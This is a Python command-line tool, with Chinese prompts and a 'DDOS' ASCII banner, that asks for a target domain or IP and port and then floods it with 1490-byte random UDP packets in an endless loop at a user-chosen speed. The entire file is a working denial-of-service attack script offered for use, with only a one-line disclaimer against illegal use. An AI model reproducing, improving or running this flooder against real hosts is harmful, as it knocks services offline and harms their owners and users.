# python3
import sys
import os
import time
import socket
import random
import re

os.system("cls")

print(r"""
   _____   ____    ____   _____   _   _   _____   _____  
  |  __ \ / __ \  / __ \ / ____| | \ | | / ____| / ____| 
  | |  | | |  | || |  | || (___   |  \| || |     | (___   
  | |  | | |  | || |  | | \___ \  | . ` || |      \___ \  
  | |__| | |__| || |__| | ____) | | |\  || |____  ____) | 
  |_____/ \____/  \____/ |_____/  |_| \_| \_____||_____/  

""")
print(" ")
print("/---------------------------------------------------\\")
print("|   作者          : Andysun06                       |")
print("|   二改          : xiaonuo                         |")
print("|   kali-QQ学习群 : 909533854                       |")
print("|   版本          : V2.0 (支持域名解析)               |")
print("|                                                  |")
print("\\---------------------------------------------------/")
print(" ")
print(" -----------------[请勿用于违法用途]----------------- ")
print(" ")

target = input("请输入目标 (域名 或 IP:端口) : ").strip()
if not target:
    print("未输入目标，退出。")
    sys.exit(1)

match = re.match(r'^(.+?)(?::(\d+))?$', target)
if match:
    host = match.group(1)
    port = match.group(2)
    if port:
        port = int(port)
else:
    host = target
    port = None
if port is None:
    try:
        port = int(input("请输入攻击端口 (默认80): ") or "80")
    except ValueError:
        print("端口无效，使用默认80")
        port = 80

try:
    addrinfo = socket.getaddrinfo(host, None, socket.AF_INET)
    ips = []
    for addr in addrinfo:
        ip = addr[4][0]
        if ip not in ips:
            ips.append(ip)
    if not ips:
        print("[!] 解析失败，未找到IP地址。")
        sys.exit(1)
except socket.gaierror as e:
    print(f"[!] 解析失败: {e}")
    sys.exit(1)

ip = ips[0]
if len(ips) > 1:
    print(f"[*] 发现 {len(ips)} 个IP，将使用第一个: {ip}")
else:
    print(f"[*] 解析到IP: {ip}")

try:
    sd = int(input("攻击速度(1~1000) : "))
except ValueError:
    print("速度无效，使用默认500")
    sd = 500

os.system("cls")
print(f"[*] 攻击目标: {host} ({ip}) 端口 {port}")
print(f"[*] 速度档位: {sd} (数值越大越快)")
print("[*] 按 Ctrl+C 停止攻击...\n")

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
payload = random._urandom(1490)

sent = 0
try:
    while True:
        sock.sendto(payload, (ip, port))
        sent += 1
        print(f"已发送 {sent} 个数据包到 {ip}:{port}", end='\r')
        time.sleep((1000 - sd) / 2000)
except KeyboardInterrupt:
    print("\n\n[!] 攻击已停止")
    print(f"[+] 总共发送数据包: {sent}")
finally:
    sock.close()